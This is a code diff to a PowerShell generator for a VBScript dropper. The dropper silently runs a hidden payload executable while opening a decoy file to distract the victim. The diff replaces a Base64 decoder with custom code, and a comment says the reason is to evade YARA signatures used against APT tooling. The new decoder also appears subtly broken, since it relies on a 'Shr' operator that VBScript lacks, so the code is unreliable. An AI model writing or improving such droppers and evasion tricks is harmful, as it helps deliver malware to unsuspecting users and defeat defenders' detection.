@@ -76,26 +76,41 @@ $decoyNameB64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetByt
 # Uses ScriptFullName for self-location (no hardcoded paths)
 # Shell.Run second arg: 0 = hidden window for payload, 1 = normal for decoy
 # Note: PowerShell here-string will expand $exeNameB64/$decoyNameB64 to their values
+# P2: Custom Base64 decode — avoids MSXML2.DOMDocument COM object (APT YARA target)
 $vbsContent = @"
 Dim ws, fso, d, ex, dc
 Set ws = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 d = fso.GetParentFolderName(WScript.ScriptFullName)
-ex = Decode("$exeNameB64")
-dc = Decode("$decoyNameB64")
+ex = B64D("$exeNameB64")
+dc = B64D("$decoyNameB64")
 ws.Run d & "\" & ex, 0, False
-ws.Run "notepad.exe " & d & "\" & dc, 1, False
-Function Decode(b)
-  Dim e, a, s
-  Set e = CreateObject("MSXML2.DOMDocument").CreateElement("e")
-  e.DataType = "bin.base64"
-  e.Text = b
-  a = e.NodeTypedValue
-  s = ""
-  For i = 0 To UBound(a) Step 2
-    s = s & ChrW(a(i) + a(i+1) * 256)
+ws.Run d & "\" & dc, 1, False
+Function B64D(s)
+  Dim c(63), o, r, i, n, p, q, t, w
+  c(0)=65:c(1)=66:c(2)=67:c(3)=68:c(4)=69:c(5)=70:c(6)=71:c(7)=72
+  c(8)=73:c(9)=74:c(10)=75:c(11)=76:c(12)=77:c(13)=78:c(14)=79:c(15)=80
+  c(16)=81:c(17)=82:c(18)=83:c(19)=84:c(20)=85:c(21)=86:c(22)=87:c(23)=88
+  c(24)=89:c(25)=90:c(26)=97:c(27)=98:c(28)=99:c(29)=100:c(30)=101:c(31)=102
+  c(32)=103:c(33)=104:c(34)=105:c(35)=106:c(36)=107:c(37)=108:c(38)=109:c(39)=110
+  c(40)=111:c(41)=112:c(42)=113:c(43)=114:c(44)=115:c(45)=116:c(46)=117:c(47)=118
+  c(48)=119:c(49)=120:c(50)=121:c(51)=122:c(52)=48:c(53)=49:c(54)=50:c(55)=51
+  c(56)=52:c(57)=53:c(58)=54:c(59)=55:c(60)=56:c(61)=57:c(62)=43:c(63)=47
+  r=""
+  For i=1 To Len(s) Step 4
+    n=0:p=0
+    For q=0 To 3
+      t=Asc(Mid(s,i+q,1))
+      If t=61 Then Exit For
+      For w=0 To 63
+        If c(w)=t Then n=n*64+w:p=p+1:Exit For
+      Next
+    Next
+    If p=2 Then r=r&ChrW((n Shr 8) And 255)
+    If p=3 Then r=r&ChrW((n Shr 16) And 255)&ChrW((n Shr 8) And 255)
+    If p=4 Then r=r&ChrW((n Shr 24) And 255)&ChrW((n Shr 16) And 255)&ChrW((n Shr 8) And 255)
   Next
-  Decode = s
+  B64D=r
 End Function
 "@
 
